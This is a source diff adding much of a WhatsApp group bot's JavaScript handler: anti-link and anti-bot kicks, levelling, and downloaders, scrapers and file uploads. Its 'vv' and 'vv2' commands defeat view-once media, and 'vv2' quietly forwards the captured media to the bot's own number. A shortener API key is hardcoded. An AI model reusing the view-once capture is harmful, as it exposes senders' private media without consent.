+await m.reply("You will be kicked out of this group for tagging multiple people while anti-tag mode is enabled.")
+await ednut.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+}
+}
+
+async function styletext(teks) {
+    return new Promise((resolve, reject) => {
+        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
+        .then(({ data }) => {
+            let $ = cheerio.load(data)
+            let hasil = []
+            $('table > tbody > tr').each(function (a, b) {
+hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
+            })
+            resolve(hasil)
+        })
+    })
+}
+
+        //download status #ctto
+if (global.db && global.db.settings && global.db.settings.send)
+    if (body.includes('share') || body.includes('Send') || body.includes('send'))  {
+   	if (m.quoted?.chat != 'status@broadcast') return 
+	let buffer = await m.quoted.download()
+	await ednut.sendFile(m.chat, buffer, '', m.quoted.text || '', null, false, { quoted: m }).catch(_ => m.reply(m.quoted.text || ''))
+      }
+ 
+// Auto reaction all
+if (global.db.settings && global.db.settings.areact2 && isMessage && isCmd2) {
+try {
+const emojis = ['😀', '😃', '😄', '😁', '😆', '😂', '🤣', '😊', '😇', '🙂', '🙃', '😉', '😌', '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭', '😳', '😴', '😵', '😶', '😷', '😸', '😹', '😺', '😻', '😼', '😽', '😾', '😿', '🙀', '😱', '😲', '😳', '😴', '😵', '😶', '😷', '😸', '😹', '😺', '😻', '😼', '😽', '😾', '😿', '🤷‍♂️', '🤷‍♀️', '👨', '👩', '🚶‍♂️', '🚶‍♀️', '🏃‍♂️', '🏃‍♀️', '🕺', '🤺', '🏋️‍♂️', '🏋️‍♀️', '🚴‍♂️', '🚴‍♀️', '🏊‍♂️', '🏊‍♀️', '🤾‍♂️', '🤾‍♀️', '🏄‍♂️', '🏄‍♀️', '🚣‍♂️', '🚣‍♀️', '🏊‍♂️', '🏊‍♀️', '🤿‍♂️', '🤿‍♀️', '🎿', '🏂', '🏌️', '🏌️‍♀️', '🏄‍♂️', '🚣‍♀️', '🤹‍♂️', '🤹‍♀️', '🚴‍♀️', '🚴‍♂️', '🏊‍♀️', '🏊‍♂️', '🚣‍♂️', '🚣‍♀️', '🤾‍♀️', '🤾‍♂️', '🏄‍♀️', '🏄‍♂️', '🏊‍♀️', '🏊‍♂️', '🚴‍♂️', '🚴‍♀️', '🏌️', '🏌️‍♀️', '🏂', '🏂‍♀️', '🤺', '🤺‍♀️', '👺', '👻', '🕷️', '🕸️', '👻', '👺', '💀', '👽', '🤖', '🚀', '👾', '🛸', '🚁', '🚂', '🚂', '🚃', '🚄', '🚅', '🚆', '🚇', '🚈', '🚉', '🚊', '🚋', '🚌', '🚍', '🚎', '🚏', '🚐', '🚑', '🚒', '🚓', '🚔', '🚕', '🚖', '🚗', '🚘', '🚙', '🚚', '🚛', '🚜', '🚝', '🚞', '🚟', '🚠', '🚡', '🚢', '🚣', '🚤', '🚥', '🚦', '🚧', '🚨', '🚩', '🚪', '🚫', '🚬', '🚭', '🚮', '🚯', '🚰', '🚱', '🚲', '🚳', '🚴', '🚵', '🚶'];
+const getRandomEmoji = () => emojis[Math.floor(Math.random() * emojis.length)];
+if (m.key && m.key.remoteJid && m.key.id) {
+const randomEmoji = getRandomEmoji();
+await ednut.sendMessage(m.chat, { react: { text: randomEmoji, key: m.key } });
+}
+} catch (error) {
+console.error("Error in AutoReact:", error.message || error);
+}
+}
+ 
+ 
+ // mode settings
+        if (global.db.settings.mode)
+        if (!isOwner && !isSetsudo) {
+          if (isCmd) {
+            return
+          }
+        }
+        
+if (global.db.settings && global.db.settings.areact && isCmd) {
+  try {
+    await ednut.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
+    await sleep(2000) // sleep for some seconds
+    await ednut.sendMessage(m.chat, { react: { text: '', key: m.key } })
+} catch (error) {
+  console.error("Error in AutoReact:", error.message || error);
+}
+}
+
+
+// antibot
+ if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antibot) {
+ if (m.isBaileys && m.fromMe) return 
+  let chat = m.chat;
+  let sender = m.sender;
+  let hapus = m.key.participant;
+  let bang = m.key.id;
+    if (m.isBaileys && !m.fromMe) {
+      if (isAdmins || !isBotAdmins) {
+        return 
+      } else {
+        await ednut.sendText(m.chat, `bot detected user kicked`);
+        return await ednut.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
+      }
+    }
+  }
+
+
+// Antilink Kick
+if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antilink) {
+  if (body.match('http://') || body.match('https://')) {
+    if (isOwner || isAdmins || m.key.fromMe) return
+    if (!isBotAdmins) return m.reply('Link detected! Make the bot admin to take antilink actions')
+    await ednut.sendMessage(m.chat, { delete: { remoteJid: m.chat,fromMe: false, id: m.key.id,participant: m.key.participant}}) 
+    ednut.sendMessage(m.chat, { text: `Link detected @${m.sender.split("@")[0]} You will be kicked out contact the admin if link was dropped mistakenly`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m })
+    await sleep (3000) //to avoid rate overlimit
+    await ednut.groupParticipantsUpdate(m.chat,[m.sender],'remove')
+  }
+}
+
+// Antilink delete
+if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antilink2) {
+  if (body.includes("https://")) {
+    if (isOwner || isAdmins || m.key.fromMe) return
+    if (!isBotAdmins) return m.reply('Link detected! Make the bot admin to take antilink actions')
+    await ednut.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } })
+    ednut.sendMessage(m.chat, { text: `Link detected @${m.sender.split("@")[0]} admin turned on antilink feature no link will be posted without admin consent`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m })
+  }
+}
+
+// Antilink warn delete and kick
+if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antilink3) {
+  if (body.includes("https://")) {
+    if (isOwner || isAdmins || m.key.fromMe) return;
+    if (!isBotAdmins) return m.reply('Link detected! Make the bot admin to take antilink actions');
+
+    // Delete the message
+        await ednut.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } })
+
+    let war = global.warn;
+    let who = m.sender;
+    let name = ednut.getName(m.sender);
+    let warn = global.db.users[who].warn;
+  // give warn
+    if (warn < war) {
+      global.db.users[who].warn += 1;
+      ednut.sendMessage(m.chat, {
+        text: `*ANTILINK WARNING*
+▢ *User:* @${who.split`@`[0]}
+▢ *Warning:* ${warn + 1}/${war}
+▢ *Reason:* Sending links`,
+        mentions: [who]
+      });
+    } else if (warn == war) {
+      global.db.users[who].warn = 0;
+      await sleep(1000);
+      // kick out
+      await ednut.groupParticipantsUpdate(m.chat, [who], 'remove');
+      ednut.sendMessage(m.chat, {
+        text: `♻️@${who.split`@`[0]} was removed from group *${groupMetadata.subject}* because they have been warned for sending link *${war}* times.`,
+        mentions: [who]
+      });
+    }
+  }
+}
+
+
+function randomNumber() {
+  let randomNumber = Math.floor(Math.random() * 1000000)
+  return randomNumber.toString().padStart(6, '0')
+}
+
+async function upscale(buffer) {
+  const blob = new Blob([buffer], { type: 'image/png' })
+  let filename = randomNumber() + '.png'
+  let formData = new FormData()
+  formData.append('image', {})
+  formData.append('image', blob, filename)
+
+  let { data } = await axios.post('https://api.imggen.ai/guest-upload', formData, {
+    headers: {
+      "content-type": "multipart/form-data",
+      origin: "https://imggen.ai",
+      referer: "https://imggen.ai/",
+      "user-agent": "Mozilla/5.0"
+    }
+  })
+
+  let result = await axios.post('https://api.imggen.ai/guest-upscale-image', {
+    image: {
+      "url": "https://api.imggen.ai" + data.image.url,
+      "name": data.image.name,
+      "original_name": data.image.original_name,
+      "folder_name": data.image.folder_name,
+      "extname": data.image.extname
+    }
+  }, {
+    headers: {
+      "content-type": "application/json",
+      origin: "https://imggen.ai",
+      referer: "https://imggen.ai/",
+      "user-agent": "Mozilla/5.0"
+    }
+  })
+  return `https://api.imggen.ai${result.data.upscaled_image}`
+}
+
+async function uploadToCdn(Path) {
+    return new Promise(async (resolve, reject) => {
+        if (!fs.existsSync(Path)) return reject(new Error("File not found."));
+        try {
+            const form = new BodyForm();
+            form.append("file", fs.createReadStream(Path));
+            const response = await axios({
+                url: "https://cdn.meitang.xyz/upload",
+                method: "POST",
+                headers: {
+                    ...form.getHeaders()
+                },
+                data: form
+            });
+            return resolve(response.data.file.url)
+        } catch (err) {
+            return reject(new Error(`cant upload: ${err.message}`));
+        }
+    });
+}
+
+async function ephoto(url, texk) {
+let form = new FormData 
+let gT = await axios.get(url, {
+  headers: {
+    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
+  }
+})
+let $ = cheerio.load(gT.data)
+let text = texk
+let token = $("input[name=token]").val()
+let build_server = $("input[name=build_server]").val()
+let build_server_id = $("input[name=build_server_id]").val()
+form.append("text[]", text)
+form.append("token", token)
+form.append("build_server", build_server)
+form.append("build_server_id", build_server_id)
+let res = await axios({
+  url: url,
+  method: "POST",
+  data: form,
+  headers: {
+    Accept: "*/*",
+    "Accept-Language": "en-US,en;q=0.9",
+    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
+    cookie: gT.headers["set-cookie"]?.join("; "),
+    ...form.getHeaders()
+  }
+})
+let $$ = cheerio.load(res.data)
+let json = JSON.parse($$("input[name=form_value_input]").val())
+json["text[]"] = json.text
+delete json.text
+let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
+  headers: {
+    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
+    cookie: gT.headers["set-cookie"].join("; ")
+    }
+})
+return build_server + data.image
+}
+
+async function UploadFileUgu (input) {
+	return new Promise (async (resolve, reject) => {
+			const form = new BodyForm();
+			form.append("files[]", fs.createReadStream(input))
+			await axios({
+				url: "https://uguu.se/upload.php",
+				method: "POST",
+				headers: {
+					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
+					...form.getHeaders()
+				},
+				data: form
+			}).then((data) => {
+				resolve(data.data.files[0])
+			}).catch((err) => reject(err))
+	})
+}
+
+async function reply2(teks) {
+return ednut.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
+showAdAttribution: true, thumbnailUrl: pp, title: `${global.botname}`, body: `${runtime(process.uptime())}`, previewType: "PHOTO"}}}, {quoted: m})
+}   
+
+        try {
+            ppuser = await ednut.profilePictureUrl(m.sender, 'image')
+        } catch (err) {
+            ppuser = 'https://raw.githubusercontent.com/latesturl/dbCDN/refs/heads/main/my-DB/profile.jpg'
+        }
+        ppnyauser = await getBuffer(ppuser)
+
+        const reSize = async (buffer, ukur1, ukur2) => {
+            return new Promise(async (resolve, reject) => {
+                let jimp = require('jimp')
+                var baper = await jimp.read(buffer);
+                var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
+                resolve(ab)
+            })
+        }
+        const fkethmb = await reSize(ppuser, 300, 300)
+        let jimp = require("jimp")
+        const resize = async (image, width, height) => {
+            const read = await jimp.read(image);
+            const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
+            return data;
+        };
+        
+        
+              async function ranke(idnya) {
+          var rrole = global.db.users[idnya].level
+          var rank = 'Bronze'
+          var rankid = 1
+          if (rrole <= 1) {
+            rank = 'Bronze'
+            rankid = 1
+          } else if (rrole <= 2) {
+            rank = 'Bronze'
+            rankid = 2
+          } else if (rrole <= 3) {
+            rank = 'Bronze'
+            rankid = 3
+          } else if (rrole <= 4) {
+            rank = 'Silver'
+            rankid = 1
+          } else if (rrole <= 5) {
+            rank = 'Silver'
+            rankid = 2
+          } else if (rrole <= 6) {
+            rank = 'Silver'
+            rankid = 3
+          } else if (rrole <= 7) {
+            rank = 'Gold'
+            rankid = 1
+          } else if (rrole <= 8) {
+            rank = 'Gold'
+            rankid = 2
+          } else if (rrole <= 9) {
+            rank = 'Gold'
+            rankid = 3
+          } else if (rrole <= 10) {
+            rank = 'Diamond'
+            rankid = 1
+          } else if (rrole <= 11) {
+            rank = 'Diamond'
+            rankid = 2
+          } else if (rrole <= 12) {
+            rank = 'Diamond'
+            rankid = 3
+          } else if (rrole <= 13) {
+            rank = 'Heroic'
+            rankid = 1
+          } else if (rrole <= 14) {
+            rank = 'Master'
+            rankid = 2
+          } else if (rrole <= 15) {
+            rank = 'Grandmaster'
+            rankid = 0
+          }
+          return { rank, rankid }
+        }
+        
+        try {
+          ppuser = await ednut.profilePictureUrl(m.sender, 'image')
+        } catch {
+          ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
+        }
+        
+        const leveling = require('./all/levelling')
+        async function addLevel(userId, xp, db, m) {
+          let user = db.users[userId]
+          if (!user) {
+            user = { level: 0, exp: 0 }
+            db.users[userId] = user
+          }
+          
+          const leveledUp = leveling.autoLevelUp(user, xp)
+          if (leveledUp) {
+            await handleLevelUp(user, m)
+          } else if (user.level >= 15) {
+            await notifyMaxLevel(user, m)
+          }
+        }
+        
+        
+        async function handleLevelUp(user, m) {
+            let txt = `congrat you leveled up 🎉\nUser: ${m.pushName}\nLevel: ${user.level - 1} •> ${user.level}\nExp: ${user.exp}\n\n> © ᴀʀᴄʜ ᴍᴅ ²⁵`
+            
+        if (menutype === 'v1') {
+                    ednut.sendMessage(m.chat, {
+                        text: txt,
+                        contextInfo: {
+                            externalAdReply: {
+                              showAdAttribution: true,
+                                title: botname,
+                                body: 'level up 🪀',
+                                thumbnailUrl: ppuser,
+                                sourceUrl: '',
+                                mediaType: 1,
+                                renderLargerThumbnail: true
+                            }
+                        }
+                    }, {
+                        quoted: m
+                    })
+} else if (menutype === 'v2' ) {
+                    ednut.sendMessage(m.chat, { text: txt }, {
+                        quoted: m
+                    })
+ } else if (menutype === 'v3' )
+ {
+await   ednut.sendMessage(m.chat, { image: { url: ppuser }, caption: txt }, { quoted: m })
+}
+}
+ 
+ if (global.db && global.db.settings && global.db.settings.levelup) {
+ if (isCmd || isCmd2 && !m.fromMe) {
+    const xp = randomNomor(39, 89)
+    addLevel(m.sender, xp, global.db, m)
+}
+}
+
+async function catbox(content) {
+  const { ext, mime } = (await fromBuffer(content)) || {};
+
+  const formData = new BodyForm();
+  const random = crypto.randomBytes(5).toString("hex");
+  formData.append("reqtype", "fileupload");
+  //formData.append("fileToUpload", blob, randomBytes + "." + ext);
+  formData.append('fileToUpload', content, { filename: "tmp"+random + '.' + ext, contentType: mime });
+
+  const response = await fetch("https://catbox.moe/user/api.php", {
+    method: "POST",
+    body: formData,
+    headers: {
+      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
+      //...formData.getHeaders(),
+    },
+  });
+
+  return await response.text();
+}       
+
+const pluginsLoader = async (directory) => {
+let plugins = []
+const folders = fs.readdirSync(directory)
+folders.forEach(file => {
+const filePath = path.join(directory, file)
+if (filePath.endsWith(".js")) {
+try {
+const resolvedPath = require.resolve(filePath);
+if (require.cache[resolvedPath]) {
+delete require.cache[resolvedPath]
+}
+const plugin = require(filePath)
+plugins.push(plugin)
+} catch (error) {
+console.log(`Error loading plugin at ${filePath}:`, error)
+}}
+})
+return plugins
+}
+
+
+
+let pluginsDisable = true
+const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"))
+const ednutdev = { ednut, isOwner, command, isCmd, isCmd2, text, runtime, mime, sleep, speed, botNumber, pushname, example, isGroup, groupMetadata, isBotAdmins, isGroupAdmins, isAdmins, reply4}
+for (let plugin of plugins) {
+if (plugin.command.find(e => e == command.toLowerCase())) {
+pluginsDisable = false
+if (typeof plugin !== "function") return
+await plugin(m, ednutdev)
+}
+}
+if (!pluginsDisable) return
+
+        
+switch (command) {
+        
+case "play": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!text) return m.reply(example("_past lives_"))
+let ytsSearch = await yts(text)
+const res = await ytsSearch.all[0]
+
+var anu = await ytdl.ytmp3(`${res.url}`)
+
+if (anu.status) {
+let urlMp3 = anu.download.url
+await ednut.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"},{quoted: m})
+} else {
+return m.reply("_Error! Result Not Found_")
+}
+}
+break
+//================================================================================
+
+case "video": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!text) return m.reply(example("_past lives_"))
+let ytsSearch = await yts(text)
+const res = await ytsSearch.all[0]
+
+var anu = await ytdl.ytmp4(`${res.url}`)
+
+if (anu.status) {
+let urlMp3 = anu.download.url
+await ednut.sendMessage(m.chat, {video: {url: urlMp3}, ptv: false, mimetype: "video/mp4"}, {quoted: m})
+} else {
+return m.reply("_Error! Result Not Found_")
+}
+}
+break
+
+//===============================================================================
+
+case "yts": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!text) return m.reply(example('_past lives_'))
+let ytsSearch = await yts(text)
+const anuan = ytsSearch.all
+let teks = "*[ YouTube search result ⌛]*\n\n"
+for (let res of anuan) {
+teks += `* *Title :* ${res.title}
+* *Duration :* ${res.timestamp}
+* *Upload :* ${res.ago}
+* *Views :* ${res.views}
+* *Author :* ${res?.author?.name || "Unknown"}
+* *Source :* ${res.url}\n\n`
+}
+await m.reply(teks)
+}
+break
+
+//===============================================================================
+
+case "ytmp3": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!text) return m.reply(example("_youtube vid link_"))
+if (!text.startsWith("https://")) return m.reply("_please input a valid youtube link_")
+
+var anu = await ytdl.ytmp3(`${text}`)
+
+if (anu.status) {
+let urlMp3 = anu.download.url
+await ednut.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
+} else {
+return m.reply("Error! Result Not Found")
+}
+}
+break
+
+//================================================================================
+
+case "ytmp4": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!text) return m.reply(example("_youtube vid link_"))
+if (!text.startsWith("https://")) return m.reply("_please input a valid YouTube link_")
+var anu = await ytdl.ytmp4(`${text}`)
+
+if (anu.status) {
+let urlMp3 = anu.download.url
+await ednut.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
+} else {
+return m.reply("_Error! Result Not Found_")
+}
+}
+break
+
+//===============================================================================
+
+case 'mediafire': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!args[0]) return m.reply(example("https://www.mediafire.com/file/xxxxxxxxxx"))
+if (!args[0].startsWith("https://")) return m.reply("please input a valid mediafire link")
+try {
+let url = args[0]
+let api = await fetch(`https://api.agatz.xyz/api/mediafire?url=${url}`)
+let res = await api.json()
+let data = res.data[0]
+let caption = `*MediaFire Downloader* -\n_Name: ${data.nama}_\n_Size: ${data.size}_\n_Extension: ${data.mime}_\n_Link: ${data.link}_`
+await ednut.sendMessage(m.chat, { document: { url: data.link }, mimetype: data.mime, fileName: data.nama, caption: caption }, { quoted: m })
+} catch (error) {
+console.log(error)
+m.reply(error)
+}
+} 
+break
+//================================================================================
+
+case "tiktokmp3": case "ttmp3": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!text) return m.reply(example("input tiktok link"))
+if (!text.startsWith('https://')) return m.reply("the link you input is invalid")
+await tiktokDl(text).then(async (res) => {
+if (!res.status) return m.reply("Error! Result Not Found")
+await ednut.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
+}).catch((e) => m.reply("Error! Result Not Found"))
+}
+break
+
+case 'tourl': case 'url':{
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+  let q = m.quoted ? m.quoted : m;
+  let mime = (q.msg || q).mimetype || '';
+  if (!mime) return m.reply(example(`reply to a media`))
+  let media = await q.download();
+  let tmphasil = await tmpfiles(media)
+  m.reply(`*Link*: ${tmphasil}`);
+}
+break
+
+//================================================================================
+
+
+case "gitclone": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!text) return m.reply(example("https://github.com/ednut001/arch-md"))
+let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
+if (!regex.test(text)) return m.reply("Link you input is invalid")
+try {
+    let [, user, repo] = args[0].match(regex) || []
+    repo = repo.replace(/.git$/, '')
+    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
+    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
+    ednut.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
+} catch (e) {
+await m.reply(`Error! Repository not found`)
+}}
+break
+
+//================================================================================
+
+
+case "ssweb": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!text) return m.reply(example("https://example.com"))
+if (!isUrl(text)) return m.reply(example("https://example.com"))
+const {
+  screenshotV1, 
+  screenshotV2,
+  screenshotV3 
+} = require('getscreenshot.js')
+const fs = require('fs')
+var data = await screenshotV2(text)
+await ednut.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
+}
+break
+
+case 'google': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+ if (!text) return m.reply(example('how to cook'))
+let google = require('google-it')
+google({'query': text}).then(res => {
+let teks = `Google result for: ${text}\n\n`
+for (let g of res) {
+teks += `*Title* : ${g.title}\n`
+teks += `*Description* : ${g.snippet}\n`
+teks += `*Link* : ${g.link}\n\n───────────────────\n\n`
+} 
+m.reply(teks)
+})
+}
+break
+
+//================================================================================
+
+case "shortlink": case "shorturl": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!text) return m.reply(example("https://example.com"))
+if (!isUrl(text)) return m.reply(example("https://example.com"))
+let res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
+var link = `${res.data.toString()}`
+return m.reply(link)
+}
+break
+
+
+case "shortlink-dl": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!text) return m.reply(example("https://example.com"))
+if (!isUrl(text)) return m.reply(example("https://example.com"))
+var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
+await ednut.sendMessage(m.chat, {text: a.url}, {quoted: m})
+}
+break
+
+//================================================================================
+
+case "idgc": case "jid": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+m.reply(m.chat)
+}
+break
+
+case 'gcinfo': case 'groupinfo': {
+if (!m.isGroup) return m.reply(msg.group)
+
+let metadata = await ednut.groupMetadata(m.chat)
+// get group profile picture 
+try {
+ppgc = await ednut.profilePictureUrl(m.chat, 'image')
+} catch (err) {
+ppgc = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
+    }
+ppnyauser = await getBuffer(ppgc)
+let group = metadata.id;
+let subject = metadata.subject;
+let members = metadata.size;
+let owner = metadata.owner || 'no owner';
+let desc = metadata.desc || 'no description';
+let access = metadata.announce;
+let check = metadata.joinApprovalMode;
+let created = metadata.creation;
+let community = metadata.isCommunity;
+let welcome = global.db.groups[m.chat].welcome;
+let goodbye = global.db.groups[m.chat].goodbye;
+let antilink1 = global.db.groups[m.chat].antilink;
+let antilink2 = global.db.groups[m.chat].antilink2;
+let antilink3 = global.db.groups[m.chat].antilink3;
+let antibot = global.db.groups[m.chat].antibot;
+let antitag = global.db.groups[m.chat].antitag;
+let antilinkAction;
+if (antilink1 === true) {
+  antilinkAction = 'kick';
+} else if (antilink2 === true) {
+  antilinkAction = 'delete';
+} else if (antilink3 === true) {
+  antilinkAction = 'warn';
+}
+
+
+let caption = `Name: ${subject}
+id: ${group}
+participant: ${members}
+owner: ${owner}
+announcement: ${access}
+approval: ${check}
+community: ${community}
+created at: ${new Date(created * 1000).toLocaleString()}
+description: ${desc}
+welcome: ${welcome ? "on" : "off"}
+Goodbye: ${goodbye ? "on" : "off"}
+antilink: ${antilinkAction || 'off'}
+antibot: ${antibot ? "on" : "off"}
+antitag: ${antitag ? "on" : "off"}`
+
+ednut.sendMessage(m.chat, { image: { url: ppgc }, caption: caption }, { quoted: m });
+}
+break
+
+//================================================================================
+
+case "listgc": case "listgroup": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return
+let teks = `\n *乂 List all group chat*\n`
+let a = await ednut.groupFetchAllParticipating()
+let gc = Object.values(a)
+teks += `\n* *Total group :* ${gc.length}\n`
+for (const u of gc) {
+teks += `\n* *ID :* ${u.id}
+* *Name :* ${u.subject}
+* *Member :* ${u.participants.length}
+* *Status :* ${u.announce == false ? "Open": "closed"}
+* *Owner :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Already out"}\n`
+}
+return m.reply(teks)
+}
+break
+
+//================================================================================
+
+//================================================================================
+
+case 'sticker': case 's': {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!/image|video/.test(mime)) return m.reply(example("reply to a image or video"))   
+let getRandom = (ext) => {
+return `${Math.floor(Math.random() * 10000)}${ext}`
+  }
+	let ahuh = args.join(' ').split('|')
+	let satu = ahuh[0] !== '' ? ahuh[0] : (global.author)
+	let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
+	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
+	let media = await ednut.downloadAndSaveMediaMessage(quoted)
+	let jancok = new Sticker(media, {
+	pack: satu, // The pack name
+	author: dua, // The author name
+	type: StickerTypes.FULL, // The sticker type
+	categories: ['🤩', '🎉'], // The sticker category
+	id: '12345', // The sticker id
+	quality: 70, // The quality of the output file
+	background: '#FFFFFF00' // The sticker background color (only for full stickers)
+	})
+	let stok = getRandom(".webp")
+	let nono = await jancok.toFile(stok)
+	let nah = fs.readFileSync(nono)
+	await ednut.sendMessage(m.chat,{sticker: nah},{quoted: m})
+	await fs.unlinkSync(stok)
+	await fs.unlinkSync(media)
+}
+break
+//================================================================================
+
+case "vv": case "readviewonce": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+    if (!m.quoted) {
+        return m.reply(`*Reply to an image, video, or audio with the caption ${prefix + command}*`);
+    }
+
+    let mime = (m.quoted.msg || m.quoted).mimetype || '';
+    try {
+        if (/image/.test(mime)) {
+            let media = await m.quoted.download();
+            await ednut.sendMessage(m.chat, {
+                image: media,
+                caption: "",
+            }, { quoted: m });
+
+        } else if (/video/.test(mime)) {
+            let media = await m.quoted.download();
+            await ednut.sendMessage(m.chat, {
+                video: media,
+                caption: "",
+            }, { quoted: m });
+
+        } else if (/audio/.test(mime)) {
+            let media = await m.quoted.download();
+            await ednut.sendMessage(m.chat, {
+                audio: media,
+                mimetype: 'audio/mpeg',
+                ptt: true // Set to true if you want to send as a voice note
+            }, { quoted: m });
+
+        } else {
+            m.reply(`❌ Unsupported media type!\nReply to an image, video, or audio with *${prefix + command}*`);
+        }
+    } catch (err) {
+        console.error('Error processing media:', err);
+        m.reply(`❌ Failed to process media. Please try again.`);
+    }
+}
+break
+
+case "vv2": case "readviewonce2": {
+if (m.isGroup) {
+if (global.db.groups[m.chat].banned) return
+}
+if (global.db.users[m.sender].banned) return m.reply(msg.ban)
+if (!isOwner) return m.reply(msg.owner)
+    if (!m.quoted) {
+        return m.reply(`*Reply to an image, video, or audio with the caption ${prefix + command}*`);
+    }
+
+    let mime = (m.quoted.msg || m.quoted).mimetype || '';
+    try {
+        if (/image/.test(mime)) {
+            let media = await m.quoted.download();
+            await ednut.sendMessage(botNumber, {
+                image: media,
+                caption: " ",
+            }, { quoted: m });
+
+        } else if (/video/.test(mime)) {
+            let media = await m.quoted.download();
+            await ednut.sendMessage(botNumber, {
+                video: media,
+                caption: "",
+            }, { quoted: m });
+
+        } else if (/audio/.test(mime)) {
+            let media = await m.quoted.download();
+            await ednut.sendMessage(botNumber, {
+                audio: media,
+                mimetype: 'audio/mpeg',
+                ptt: true // Set to true if you want to send as a voice note
+            }, { quoted: m });
+
+        } else {
+            m.reply(`❌ Unsupported media type!\nReply to an image, video, or audio with *${prefix + command}*`);
+        }
+    } catch (err) {
+        console.error('Error processing media:', err);
